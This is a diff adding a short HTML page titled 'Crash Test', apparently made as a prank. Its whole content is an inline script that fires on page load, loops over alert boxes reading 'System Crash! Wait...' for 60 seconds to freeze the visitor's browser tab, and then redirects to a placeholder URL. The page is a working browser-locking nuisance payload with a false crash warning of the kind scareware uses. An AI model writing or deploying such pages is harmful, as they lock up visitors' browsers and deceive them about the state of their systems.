@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Crash Test 😵</title>
+    <script>
+      const endTime = Date.now() + 60000; // 60 seconds freeze
+
+      // Infinite alert loop with block time
+      while (Date.now() < endTime) {
+        alert("🚨 System Crash! Wait...");
+      }
+
+      // Optional: After 1 min, redirect to safe page
+      window.location.href = "https://your-safe-page.com";
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
